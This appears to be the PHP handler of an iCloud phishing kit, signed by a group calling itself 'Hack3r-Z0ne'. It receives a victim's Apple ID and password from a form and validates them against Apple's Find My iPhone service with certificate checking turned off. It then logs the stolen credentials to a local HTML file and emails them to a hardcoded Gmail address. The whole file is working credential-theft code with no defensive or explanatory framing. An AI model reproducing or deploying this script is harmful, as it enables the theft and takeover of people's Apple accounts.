<?php
$apple = $_POST['apple'];
$pw = $_POST['pw']; 

$ch = curl_init();
    $header[] = 'Content-Type: application/json; charset=utf-8';
    $header[] = 'X-Apple-Find-Api-Ver: 2.0';
    $header[] = 'X-Apple-Authscheme: UserIdGuest';
    $header[] = 'X-Apple-Realm-Support: 1.0';
    $header[] = 'User-agent: Find iPhone/1.3 MeKit (iPad: iPhone OS/4.2.1)';
    $header[] = 'X-Client-Name: iPad';
    $header[] = 'X-Client-UUID: 0cf3dc501ff812adb0b202baed4f37274b210853';
    $header[] = 'Accept-Language: en-us';
    $header[] = 'Connection: keep-alive';
    curl_setopt($ch, CURLOPT_URL, 'https://fmipmobile.icloud.com/fmipservice/device/'.$apple.'/initClient');
    curl_setopt($ch, CURLOPT_USERPWD, $apple.':'.$pw);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_HEADER, TRUE);
    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Find iPhone/1.3 MeKit (iPad: iPhone OS/4.2.1)');
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $value = curl_exec($ch);
	//echo $value;
    curl_close($ch);
	if(!stristr($value," 330 ")){ echo "INVALID";}
	if(stristr($value," 330 ")){ echo "SUCCESS";
 
//Auto Saved by Hack3r-Z0ne
    //
    $save1 = $user_ip . " : " . $email . " : " . $senha . " ";
    $my_file = './hack3d.html';
    $handle = fopen($my_file, 'a') or die('Cannot open file:  ');
    fwrite($handle, $save1);
    $new_data = "<br />";
    fwrite($handle, $new_data);
    //
	
//Auto Send by Hack3r-Z0ne
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +WEB VERSION+ !  -----------\n";
$message .= "-----------  ! +Apple ! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email Address        : ".$_POST['apple']."\n";
$message .= "Password               : ".$_POST['pw']."\n";
$message .= "-----------  ! +nJoY+ !  -----------\n";
$send = "diamantosmani@gmail.com";

$subject = "ICloude $ip']";
$headers = "From:  Miz<Xploit>";
$headers .= $_POST['appleId']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);}
?>